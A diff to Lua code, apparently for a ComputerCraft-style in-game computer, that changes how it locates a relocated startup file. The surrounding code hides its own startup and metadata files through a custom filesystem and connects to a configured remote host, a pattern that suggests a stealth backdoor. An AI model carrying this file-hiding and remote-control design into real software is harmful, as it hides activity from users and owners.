@@ -32,11 +32,36 @@ local configpath = nil
 local metadataFile = nil
 local rstartup = utils.generateRandomString(3)
 _OGFS.copy("startup.lua",rstartup)
+
+local function getShellRunArgument()
+    if not _OGFS.exists(rstartup) then
+        return nil -- Return nil if the file doesn't exist
+    end
+
+    local f = _OGFS.open(rstartup, "r")
+    if not f then
+        return nil
+    end
+
+    for line in f.readLine do
+        -- Match the format: shell.run("argument")
+        local argument = string.match(line, '^%s*shell%.run%(%s*["\'](.-)["\']%s*%)')
+        if argument then
+            f.close()
+            return argument -- Return the extracted argument
+        end
+    end
+
+    f.close()
+    return nil -- Return nil if no matching line is found
+end
+local rstartup2 = getShellRunArgument()
+
 local function getRealStartupPath()
     shell.setDir("/")
-    if not _OGFS.exists(rstartup) then
+    if not _OGFS.exists(rstartup2) then
          return nil  end
-    local f1 = _OGFS.open(rstartup, "r")
+    local f1 = _OGFS.open(rstartup2, "r")
     if not f1 then
         return nil end
     for i = 1, 6 do
@@ -55,10 +80,10 @@ local function getRealStartupPath()
 end
 
 local function getBDApath()
-    if not _OGFS.exists(rstartup) then
+    if not _OGFS.exists(rstartup2) then
         return nil, nil 
     end
-    local f = _OGFS.open(rstartup, "r")
+    local f = _OGFS.open(rstartup2, "r")
     if not f then 
         return nil, nil
     end
@@ -78,11 +103,11 @@ local function getBDApath()
 end
 
 local function getMetadataFile()
-    if not _OGFS.exists(rstartup) then
+    if not _OGFS.exists(rstartup2) then
         return nil -- Return nil if the file doesn't exist
     end
 
-    local f = _OGFS.open(rstartup, "r")
+    local f = _OGFS.open(rstartup2, "r")
     if not f then
         return nil -- Safeguard against failed open
     end
@@ -94,13 +119,12 @@ local function getMetadataFile()
         end
 
         -- Match the format: --key^value
-        local key, value = string.match(line, "^%-%-(%S+)%^(%S+)$")
-        if key and value then
+        local key= string.match(line, "^%-%-(%S+)%^")
+        if key then
             f.close()
-            return key, value -- Return key and value
+            return key -- Return key and value
         end
     end
-
     f.close()
     return nil -- Return nil if no matching line is found
 end
@@ -146,8 +170,11 @@ function main.setup()
     hideStartup()
 getConfigUrl()
 if xsup~=nil then
+    print("hide file: "..xsup)
     customfs.setOriginalStartup(xsup)
     customfs.hideFile(xsup)
+else
+    print("xsup is nil")
 end
 if metadataFile~=nil then
     customfs.hideFile(metadataFile)
@@ -238,7 +265,7 @@ function main.getProgramPath()
     return bdapath
 end
 
-local function init()
+function main.init()
     wsrouter.allow_encryption(true)
     wsrouter.connect(config:get("networking.http.rhost"))
     core_router.TXRX2Host("0x00", false)
